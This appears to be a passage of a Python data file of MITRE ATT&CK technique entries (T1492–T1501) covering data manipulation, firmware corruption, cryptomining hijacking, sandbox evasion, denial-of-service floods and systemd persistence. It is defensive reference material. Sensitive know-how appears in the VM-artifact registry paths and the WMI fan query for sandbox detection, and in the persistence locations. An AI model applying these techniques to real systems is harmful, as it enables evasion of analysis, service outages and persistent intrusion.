           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1492': {'attack_id': 'T1492',
           'categories': ['impact'],
           'description': 'Adversaries may insert, delete, or manipulate data at rest in order to manipulate external '
                          'outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony '
                          '2018) By manipulating stored data, adversaries may attempt to affect a business process, '
                          'organizational understanding, and decision making. \n'
                          '\n'
                          'Stored data could include a variety of file formats, such as Office files, databases, '
                          'stored emails, and custom file formats. The type of modification and the impact it will '
                          'have depends on the type of data as well as the goals and objectives of the adversary. For '
                          'complex systems, an adversary would likely need special expertise and possibly access to '
                          'specialized software related to the system that would typically be gained through a '
                          'prolonged information gathering campaign in order to have the desired impact.',
           'name': 'Stored Data Manipulation',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1493': {'attack_id': 'T1493',
           'categories': ['impact'],
           'description': 'Adversaries may alter data en route to storage or other systems in order to manipulate '
                          'external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus '
                          'Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business '
                          'process, organizational understanding, and decision making. \n'
                          '\n'
                          'Manipulation may be possible over a network connection or between system processes where '
                          'there is an opportunity deploy a tool that will intercept and change information. The type '
                          'of modification and the impact it will have depends on the target transmission mechanism as '
                          'well as the goals and objectives of the adversary. For complex systems, an adversary would '
                          'likely need special expertise and possibly access to specialized software related to the '
                          'system that would typically be gained through a prolonged information gathering campaign in '
                          'order to have the desired impact.',
           'name': 'Transmitted Data Manipulation',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1494': {'attack_id': 'T1494',
           'categories': ['impact'],
           'description': 'Adversaries may modify systems in order to manipulate the data as it is accessed and '
                          'displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony '
                          '2018) By manipulating runtime data, adversaries may attempt to affect a business process, '
                          'organizational understanding, and decision making. \n'
                          '\n'
                          'Adversaries may alter application binaries used to display data in order to cause runtime '
                          'manipulations. Adversaries may also conduct [Change Default File '
                          'Association](https://attack.mitre.org/techniques/T1042) and '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The '
                          'type of modification and the impact it will have depends on the target application and '
                          'process as well as the goals and objectives of the adversary. For complex systems, an '
                          'adversary would likely need special expertise and possibly access to specialized software '
                          'related to the system that would typically be gained through a prolonged information '
                          'gathering campaign in order to have the desired impact.',
           'name': 'Runtime Data Manipulation',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1495': {'attack_id': 'T1495',
           'categories': ['impact'],
           'description': 'Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other '
                          'firmware in devices attached to a system in order to render them inoperable or unable to '
                          'boot.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and '
                          'executed from non-volatile memory on hardware devices in order to initialize and manage '
                          'device functionality. These devices could include the motherboard, hard drive, or video '
                          'cards.',
           'name': 'Firmware Corruption',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1496': {'attack_id': 'T1496',
           'categories': ['impact'],
           'description': 'Adversaries may leverage the resources of co-opted systems in order to solve resource '
                          'intensive problems which may impact system and/or hosted service availability. \n'
                          '\n'
                          'One common purpose for Resource Hijacking is to validate transactions of cryptocurrency '
                          'networks and earn virtual currency. Adversaries may consume enough system resources to '
                          'negatively impact and/or cause affected machines to become unresponsive.(Citation: '
                          'Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common '
                          'targets because of the high potential for available resources, but user endpoint systems '
                          'may also be compromised and used for Resource Hijacking and cryptocurrency mining.',
           'name': 'Resource Hijacking',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1497': {'attack_id': 'T1497',
           'categories': ['defense-evasion', 'discovery'],
           'description': 'Adversaries may check for the presence of a virtual machine environment (VME) or sandbox to '
                          'avoid potential detection of tools and activities. If the adversary detects a VME, they may '
                          'alter their malware to conceal the core functions of the implant or disengage from the '
                          'victim. They may also search for VME artifacts before dropping secondary or additional '
                          'payloads. \n'
                          '\n'
                          'Adversaries may use several methods including [Security Software '
                          'Discovery](https://attack.mitre.org/techniques/T1063) to accomplish [Virtualization/Sandbox '
                          'Evasion](https://attack.mitre.org/techniques/T1497) by searching for security monitoring '
                          'tools (e.g., Sysinternals, Wireshark, etc.) to help determine if it is an analysis '
                          'environment. Additional methods include use of sleep timers or loops within malware code to '
                          'avoid operating within a temporary sandboxes. (Citation: Unit 42 Pirpi July 2015)\n'
                          '\n'
                          '###Virtual Machine Environment Artifacts Discovery###\n'
                          '\n'
                          'Adversaries may use utilities such as [Windows Management '
                          'Instrumentation](https://attack.mitre.org/techniques/T1047), '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086), '
                          '[Systeminfo](https://attack.mitre.org/software/S0096), and the [Query '
                          'Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and '
                          'search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, '
                          'file system, and/or the Registry. Adversaries may use '
                          '[Scripting](https://attack.mitre.org/techniques/T1064) to combine these checks into one '
                          'script and then have the program exit if it determines the system to be a virtual '
                          'environment. Also, in applications like VMWare, adversaries can use a special I/O port to '
                          'send commands and receive output. Adversaries may also check the drive size. For example, '
                          'this can be done using the Win32 DeviceIOControl function. \n'
                          '\n'
                          'Example VME Artifacts in the Registry(Citation: McAfee Virtual Jan 2017)\n'
                          '\n'
                          '* <code>HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions</code>\n'
                          '* <code>HKLM\\HARDWARE\\Description\\System\\”SystemBiosVersion”;”VMWARE”</code>\n'
                          '* <code>HKLM\\HARDWARE\\ACPI\\DSDT\\BOX_</code>\n'
                          '\n'
                          'Example VME files and DLLs on the system(Citation: McAfee Virtual Jan 2017)\n'
                          '\n'
                          '* <code>WINDOWS\\system32\\drivers\\vmmouse.sys</code> \n'
                          '* <code>WINDOWS\\system32\\vboxhook.dll</code>\n'
                          '* <code>Windows\\system32\\vboxdisp.dll</code>\n'
                          '\n'
                          'Common checks may enumerate services running that are unique to these applications, '
                          'installed programs on the system, manufacturer/product fields for strings relating to '
                          'virtual machine applications, and VME-specific hardware/processor instructions.(Citation: '
                          'McAfee Virtual Jan 2017)\n'
                          '\n'
                          '###User Activity Discovery###\n'
                          '\n'
                          'Adversaries may search for user activity on the host (e.g., browser history, cache, '
                          'bookmarks, number of files in the home directories, etc.) for reassurance of an authentic '
                          'environment. They might detect this type of information via user interaction and digital '
                          'signatures. They may have malware check the speed and frequency of mouse clicks to '
                          'determine if it’s a sandboxed environment.(Citation: Sans Virtual Jan 2016) Other methods '
                          'may rely on specific user interaction with the system before the malicious code is '
                          'activated. Examples include waiting for a document to close before activating a macro '
                          '(Citation: Unit 42 Sofacy Nov 2018) and waiting for a user to double click on an embedded '
                          'image to activate (Citation: FireEye FIN7 April 2017).\n'
                          '\n'
                          '###Virtual Hardware Fingerprinting Discovery###\n'
                          '\n'
                          'Adversaries may check the fan and temperature of the system to gather evidence that can be '
                          'indicative a virtual environment. An adversary may perform a CPU check using a WMI query '
                          '<code>$q = “Select * from Win32_Fan” Get-WmiObject -Query $q</code>. If the results of the '
                          'WMI query return more than zero elements, this might tell them that the machine is a '
                          'physical one. (Citation: Unit 42 OilRig Sept 2018)',
           'name': 'Virtualization/Sandbox Evasion',
           'platforms': ['Windows']},
 'T1498': {'attack_id': 'T1498',
           'categories': ['impact'],
           'description': 'Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the '
                          'availability of targeted resources to users. Network DoS can be performed by exhausting the '
                          'network bandwidth services rely on. Example resources include specific websites, email '
                          'services, DNS, and web-based applications. Adversaries have been observed conducting '
                          'network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February '
                          '2016) and to support other malicious activities, including distraction(Citation: FSISAC '
                          'FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October '
                          '2014)\n'
                          '\n'
                          'A Network DoS will occur when the bandwidth capacity of the network connection to a system '
                          'is exhausted due to the volume of malicious traffic directed at the resource or the network '
                          'connections and network devices the resource relies on. For example, an adversary may send '
                          '10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the '
                          'internet. This traffic can be generated by a single system or multiple systems spread '
                          'across the internet, which is commonly referred to as a distributed DoS (DDoS). Many '
                          'different methods to accomplish such network saturation have been observed, but most fall '
                          'into two main categories: Direct Network Floods and Reflection Amplification.\n'
                          '\n'
                          'To perform Network DoS attacks several aspects apply to multiple methods, including IP '
                          'address spoofing, and botnets.\n'
                          '\n'
                          'Adversaries may use the original IP address of an attacking system, or spoof the source IP '
                          'address to make the attack traffic more difficult to trace back to the attacking system or '
                          'to enable reflection. This can increase the difficulty defenders have in defending against '
                          'the attack by reducing or eliminating the effectiveness of filtering by the source address '
                          'on network defense devices.\n'
                          '\n'
                          'Botnets are commonly used to conduct DDoS attacks against networks and services. Large '
                          'botnets can generate a significant amount of traffic from systems spread across the global '
                          'internet. Adversaries may have the resources to build out and control their own botnet '
                          'infrastructure or may rent time on an existing botnet to conduct an attack. In some of the '
                          'worst cases for DDoS, so many systems are used to generate the flood that each one only '
                          'needs to send out a small amount of traffic to produce enough volume to saturate the target '
                          'network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes '
                          'exceedingly difficult. Botnets have been used in some of the most high-profile DDoS '
                          'attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: '
                          'USNYAG IranianBotnet March 2016)\n'
                          '\n'
                          'For DoS attacks targeting the hosting system directly, see [Endpoint Denial of '
                          'Service](https://attack.mitre.org/techniques/T1499).\n'
                          '\n'
                          '###Direct Network Flood###\n'
                          '\n'
                          'Direct Network Floods are when one or more systems are used to send a high-volume of '
                          "network packets towards the targeted service's network. Almost any network protocol may be "
                          'used for Direct Network Floods. Stateless protocols such as UDP or ICMP are commonly used '
                          'but stateful protocols such as TCP can be used as well.\n'
                          '\n'
                          '###Reflection Amplification###\n'
                          '\n'
                          'Adversaries may amplify the volume of their attack traffic by using Reflection. This type '
                          'of Network DoS takes advantage of a third-party server intermediary that hosts and will '
                          'respond to a given spoofed source IP address. This third-party server is commonly termed a '
                          'reflector. An adversary accomplishes a reflection attack by sending packets to reflectors '
                          'with the spoofed address of the victim. Similar to Direct Network Floods, more than one '
                          'system may be used to conduct the attack, or a botnet may be used. Likewise, one or more '
                          'reflector may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS '
                          'May 2017)\n'
                          '\n'
                          'Reflection attacks often take advantage of protocols with larger responses than requests in '
                          'order to amplify their traffic, commonly known as a Reflection Amplification attack. '
                          'Adversaries may be able to generate an increase in volume of attack traffic that is several '
                          'orders of magnitude greater than the requests sent to the amplifiers. The extent of this '
                          'increase will depending upon many variables, such as the protocol in question, the '
                          'technique used, and the amplifying servers that actually produce the amplification in '
                          'attack volume. Two prominent protocols that have enabled Reflection Amplification Floods '
                          'are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare '
                          'NTPamplifciationDoS), though the use of several others in the wild have been '
                          'documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol '
                          'showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the '
                          'requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)',
           'name': 'Network Denial of Service',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1499': {'attack_id': 'T1499',
           'categories': ['impact'],
           'description': 'Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the '
                          'availability of services to users. Endpoint DoS can be performed by exhausting the system '
                          'resources those services are hosted on or exploiting the system to cause a persistent crash '
                          'condition. Example services include websites, email services, DNS, and web-based '
                          'applications. Adversaries have been observed conducting DoS attacks for political '
                          'purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious '
                          'activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, '
                          'and extortion.(Citation: Symantec DDoS October 2014)\n'
                          '\n'
                          'An Endpoint DoS denies the availability of a service without saturating the network used to '
                          'provide access to the service. Adversaries can target various layers of the application '
                          'stack that is hosted on the system used to provide the service. These layers include the '
                          'Operating Systems (OS), server applications such as web servers, DNS servers, databases, '
                          'and the (typically web-based) applications that sit on top of them. Attacking each layer '
                          'requires different techniques that take advantage of bottlenecks that are unique to the '
                          'respective components. A DoS attack may be generated by a single system or multiple systems '
                          'spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n'
                          '\n'
                          'To perform DoS attacks against endpoint resources, several aspects apply to multiple '
                          'methods, including IP address spoofing and botnets.\n'
                          '\n'
                          'Adversaries may use the original IP address of an attacking system, or spoof the source IP '
                          'address to make the attack traffic more difficult to trace back to the attacking system or '
                          'to enable reflection. This can increase the difficulty defenders have in defending against '
                          'the attack by reducing or eliminating the effectiveness of filtering by the source address '
                          'on network defense devices.\n'
                          '\n'
                          'Botnets are commonly used to conduct DDoS attacks against networks and services. Large '
                          'botnets can generate a significant amount of traffic from systems spread across the global '
                          'internet. Adversaries may have the resources to build out and control their own botnet '
                          'infrastructure or may rent time on an existing botnet to conduct an attack. In some of the '
                          'worst cases for DDoS, so many systems are used to generate requests that each one only '
                          'needs to send out a small amount of traffic to produce enough volume to exhaust the '
                          "target's resources. In such circumstances, distinguishing DDoS traffic from legitimate "
                          'clients becomes exceedingly difficult. Botnets have been used in some of the most '
                          'high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US '
                          'banks.(Citation: USNYAG IranianBotnet March 2016)\n'
                          '\n'
                          'In cases where traffic manipulation is used, there may be points in the the global network '
                          '(such as high traffic gateway routers) where packets can be altered and cause legitimate '
                          'clients to execute code that directs network packets toward a target in high volume. This '
                          'type of capability was previously used for the purposes of web censorship where client HTTP '
                          'traffic was modified to include a reference to JavaScript that generated the DDoS code to '
                          'overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n'
                          '\n'
                          'For attacks attempting to saturate the providing network, see the Network Denial of Service '
                          'Technique [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n'
                          '\n'
                          '### OS Exhaustion Flood\n'
                          'Since operating systems (OSs) are responsible for managing the finite resources on a '
                          'system, they can be a target for DoS. These attacks do not need to exhaust the actual '
                          'resources on a system since they can simply exhaust the limits that an OS self-imposes to '
                          'prevent the entire system from being overwhelmed by excessive demands on its capacity. '
                          'Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN '
                          'floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018)\n'
                          '\n'
                          '#### SYN Flood\n'
                          'With SYN floods excessive amounts of SYN packets are sent, but the 3-way TCP handshake is '
                          'never completed. Because each OS has a maximum number of concurrent TCP connections that it '
                          'will allow, this can quickly exhaust the ability of the system to receive new requests for '
                          'TCP connections, thus preventing access to any TCP service provided by the '
                          'server.(Citation: Cloudflare SynFlood)\n'
                          '\n'
                          '#### ACK Flood\n'
                          'ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are '
                          'sent to the target. This forces the OS to search its state table for a related TCP '
                          'connection that has already been established. Because the ACK packets are for connections '
                          'that do not exist, the OS will have to search the entire state table to confirm that no '
                          'match exists. When it is necessary to do this for a large flood of packets, the '
                          'computational requirements can cause the server to become sluggish and/or unresponsive, due '
                          'to the work it must do to eliminate the rogue ACK packets. This greatly reduces the '
                          'resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)\n'
                          '\n'
                          '### Service Exhaustion Flood\n'
                          'Different network services provided by systems are targeted in different ways to conduct a '
                          'DoS. Adversaries often target DNS and web servers, but other services have been targeted as '
                          'well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through '
                          'a variety of means, some of which apply generally while others are specific to the software '
                          'being used to provide the service.\n'
                          '\n'
                          '#### Simple HTTP Flood\n'
                          'A large number of HTTP requests can be issued to a web server to overwhelm it and/or an '
                          'application that runs on top of it. This flood relies on raw volume to accomplish the '
                          'objective, exhausting any of the various resources required by the victim software to '
                          'provide the service.(Citation: Cloudflare HTTPflood)\n'
                          '\n'
                          '#### SSL Renegotiation Attack\n'
                          'SSL Renegotiation Attacks take advantage of a protocol feature in SSL/TLS. The SSL/TLS '
                          'protocol suite includes mechanisms for the client and server to agree on an encryption '
                          'algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a '
                          'request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, '
                          'the adversary establishes a SSL/TLS connection and then proceeds to make a series of '
                          'renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in '
                          'computation cycles, this can cause an impact to the availability of the service when done '
                          'in volume.(Citation: Arbor SSLDoS April 2012)\n'
                          '\n'
                          '### Application Exhaustion Flood\n'
                          'Web applications that sit on top of web server stacks can be targeted for DoS. Specific '
                          'features in web applications may be highly resource intensive. Repeated requests to those '
                          'features may be able to exhaust resources and deny access to the application or the server '
                          'itself.(Citation: Arbor AnnualDoSreport Jan 2018)\n'
                          '\n'
                          '### Application or System Exploitation\n'
                          'Software vulnerabilities exist that when exploited can cause an application or system to '
                          'crash and deny availability to users.(Citation: Sucuri BIND9 August 2015) Some systems may '
                          'automatically restart critical applications and services when crashes occur, but they can '
                          'likely be re-exploited to cause a persistent DoS condition.',
           'name': 'Endpoint Denial of Service',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1500': {'attack_id': 'T1500',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may attempt to make payloads difficult to discover and analyze by delivering '
                          'files to victims as uncompiled code. Similar to [Obfuscated Files or '
                          'Information](https://attack.mitre.org/techniques/T1027), text-based source code files may '
                          'subvert analysis and scrutiny from protections targeting executables/binaries. These '
                          'payloads will need to be compiled before execution; typically via native utilities such as '
                          'csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n'
                          '\n'
                          'Source code payloads may also be encrypted, encoded, and/or embedded within other files, '
                          'such as those delivered as a [Spearphishing '
                          'Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in '
                          'formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) '
                          'before later being (re)compiled into a proper executable binary with a bundled compiler and '
                          'execution framework.(Citation: TrendMicro WindowsAppMac)\n',
           'name': 'Compile After Delivery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1501': {'attack_id': 'T1501',
           'categories': ['persistence'],
           'description': 'Systemd services can be used to establish persistence on a Linux system. The systemd '
                          'service manager is commonly used for managing background daemon processes (also known as '
                          'services) and other system resources.(Citation: Linux man-pages: systemd January '
                          '2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default '
                          'initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu '
                          '15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and '
                          'Upstart while remaining backwards compatible with the aforementioned init systems.\n'
                          '\n'
                          'Systemd utilizes configuration files known as service units to control how services boot '
                          'and under what conditions. By default, these unit files are stored in the '
                          '<code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and '
                          'have the file extension <code>.service</code>. Each service unit file may contain numerous '
                          'directives that can execute system commands. \n'
                          '\n'
                          '* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a '
                          "services is started manually by 'systemctl' or on system start if the service is set to "
                          'automatically start. \n'
                          '* ExecReload directive covers when a service restarts. \n'
                          '* ExecStop and ExecStopPost directives cover when a service is stopped or manually by '
                          "'systemctl'.\n"
                          '\n'
                          'Adversaries have used systemd functionality to establish persistent access to victim '
                          'systems by creating and/or modifying service unit files that cause systemd to execute '
                          'malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke '
                          'March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package '
                          'Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch '
                          'Linux Mail 8JUL2018)\n'
                          '\n'
                          'While adversaries typically require root privileges to create/modify service unit files in '
                          'the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, '
                          'low privilege users can create/modify service unit files in directories such as '
                          '<code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 '
                          'Service Persistence 22JUNE2016)',
           'name': 'Systemd Service',
           'platforms': ['Linux']}
}
